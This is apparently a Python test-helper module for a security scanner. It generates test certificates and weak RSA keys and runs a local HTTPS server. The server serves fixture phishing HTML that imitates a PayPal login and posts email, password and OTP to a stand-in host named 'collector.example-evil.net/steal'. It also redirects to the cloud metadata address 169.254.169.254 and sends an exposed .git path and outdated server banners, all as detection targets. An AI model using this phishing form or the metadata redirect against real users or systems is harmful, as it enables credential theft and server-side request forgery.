"""Test helpers: certificate generation and a local HTTPS server."""
from __future__ import annotations

import datetime as dt
import http.server
import ipaddress
import ssl
import threading
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, rsa
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID


def _name(cn):
    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])


def make_ca(cn="ThreatLens Test CA"):
    key = ec.generate_private_key(ec.SECP256R1())
    now = dt.datetime.now(dt.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(_name(cn)).issuer_name(_name(cn)).public_key(key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(now - dt.timedelta(days=1))
            .not_valid_after(now + dt.timedelta(days=30))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .add_extension(x509.KeyUsage(False, False, False, False, False, True, True, False, False), critical=True)
            .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
            .sign(key, hashes.SHA256()))
    return key, cert


def make_leaf(ca_key, ca_cert, key, names=("localhost",), days=30, self_signed=False):
    now = dt.datetime.now(dt.timezone.utc)
    subject = _name(names[0])
    issuer = subject if self_signed else ca_cert.subject
    sans = [x509.DNSName(n) for n in names] + [x509.IPAddress(ipaddress.ip_address("127.0.0.1"))]
    builder = (x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(key.public_key())
               .serial_number(x509.random_serial_number()).not_valid_before(now - dt.timedelta(days=10))
               .not_valid_after(now + dt.timedelta(days=days))
               .add_extension(x509.SubjectAlternativeName(sans), critical=False)
               .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
               .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False))
    if not self_signed:
        ca_ski = ca_cert.extensions.get_extension_for_class(x509.SubjectKeyIdentifier).value
        builder = builder.add_extension(x509.AuthorityKeyIdentifier.from_issuer_subject_key_identifier(ca_ski), critical=False)
    return builder.sign(key if self_signed else ca_key, hashes.SHA256())


def write_pair(directory: Path, name, key, cert, extra=()):
    cert_path, key_path = directory / f"{name}.pem", directory / f"{name}.key"
    cert_path.write_bytes(b"".join(c.public_bytes(serialization.Encoding.PEM) for c in (cert, *extra)))
    key_path.write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                           serialization.NoEncryption()))
    return cert_path, key_path


def miller_rabin(n, rounds=12):
    if n < 4:
        return n in (2, 3)
    if n % 2 == 0:
        return False
    d, r = n - 1, 0
    while d % 2 == 0:
        d //= 2
        r += 1
    import random
    for _ in range(rounds):
        a = random.randrange(2, n - 1)
        x = pow(a, d, n)
        if x in (1, n - 1):
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def next_prime(n):
    n += 1 if n % 2 == 0 else 2
    while not miller_rabin(n):
        n += 2
    return n


def rsa_key_from_primes(p, q, e=65537):
    n = p * q
    d = pow(e, -1, (p - 1) * (q - 1))
    numbers = rsa.RSAPrivateNumbers(p, q, d, rsa.rsa_crt_dmp1(d, p), rsa.rsa_crt_dmq1(d, q), rsa.rsa_crt_iqmp(p, q),
                                    rsa.RSAPublicNumbers(e, n))
    return numbers.private_key()


PHISH_PAGE = b"""<!doctype html><html><head><title>PayPal - Secure Login</title></head><body>
<h1>Verify your identity</h1><p>Your account will be suspended within 24 hours. Verify your account now.</p>
<form action="https://collector.example-evil.net/steal" method="post">
<input type="text" name="email"><input type="password" name="pwd"><input name="otp" placeholder="OTP"></form>
<iframe src="https://track.example-evil.net/x" width="0" height="0"></iframe>
<script>eval(atob('YWxlcnQoMSk='));document.write(unescape('%3Cb%3E'));</script>
</body></html>"""


class _Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):  # silence
        pass

    def do_GET(self):
        if self.path == "/.git/HEAD":
            body, ctype = b"ref: refs/heads/main\n", "text/plain"
        elif self.path == "/redirect":
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
            self.end_headers()
            return
        elif self.path.startswith("/missing"):
            self.send_response(404)
            self.end_headers()
            return
        else:
            body, ctype = PHISH_PAGE, "text/html"
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Server", "Apache/2.2.15 (CentOS)")
        self.send_header("X-Powered-By", "PHP/5.6.40")
        self.send_header("Set-Cookie", "PHPSESSID=abc123; Path=/")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class _QuietServer(http.server.ThreadingHTTPServer):
    def handle_error(self, request, client_address):  # certificate probes hang up without sending a request
        pass


def start_https_server(cert_path, key_path):
    srv = _QuietServer(("127.0.0.1", 0), _Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(str(cert_path), str(key_path))
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]
